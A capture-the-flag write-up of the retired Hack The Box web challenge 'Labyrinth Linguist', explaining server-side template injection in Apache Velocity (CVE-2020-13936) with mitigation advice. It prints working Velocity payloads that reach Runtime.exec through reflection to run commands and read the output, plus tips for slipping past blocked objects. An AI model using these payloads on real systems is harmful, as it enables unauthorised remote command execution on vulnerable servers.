---
challenge: Labyrinth Linguist
type: Web
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [web, java, velocity, ssti, rce, cve-2020-13936]
---

# Labyrinth Linguist — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Solved challenge; no real flags.

## TL;DR

A Java (Spring) app that "translates" text with **Apache Velocity**. The template is built from user input, so `#set` can create objects and reach `Runtime.exec`: **SSTI** with command execution.

## Brief

A form returning the text in another language. No Flask, no Jinja: the engine is **Velocity 1.7**, affected by **CVE-2020-13936** (the default `Uberspector` does not block reflection), and its syntax is `#set($var = ...)`.

## Analysis

Test the engine syntax:

```text
#set($x = 7 * 7) $x
```

If it returns `49`, the input is evaluated as a Velocity template. Velocity reaches Java classes through reflection:

```text
#set($str = $class.inspect("java.lang.Runtime").type.getRuntime().exec("id"))
```

## Exploitation

```text
#set($s = $class.inspect("java.lang.Runtime").type.getRuntime().exec("cat /flag*"))
#set($in = $s.getInputStream())
#set($br = $class.inspect("java.io.BufferedReader").type.getConstructor($class.inspect("java.io.Reader").type).newInstance($class.inspect("java.io.InputStreamReader").type.getConstructor($class.inspect("java.io.InputStream").type).newInstance($in)))
$br.readLine()
```

Shorter with `ProcessBuilder`:

```text
#set($p = $class.inspect("java.lang.ProcessBuilder").type.getConstructor($class.inspect("java.util.List").type))
```

Command output lands in the response; `cat /flag*` prints the flag.

## Pitfalls

- **Quotes and `$`**: encode `#` as `%23` when sending over GET.
- **One `readLine()`**: for multiple lines, repeat or use `System.out`.
- **Sandbox**: if `$class` is blocked, try `$context`/`$request` and framework-exposed objects.

## Lessons

- Velocity is SSTI too: the engine need not be Jinja or Twig.
- `$class.inspect` is the bridge to Java reflection and from there to `Runtime`.
- Mitigation: `VelocityEngine` with a data context, templates fixed on disk, and `SecureUberspector`.
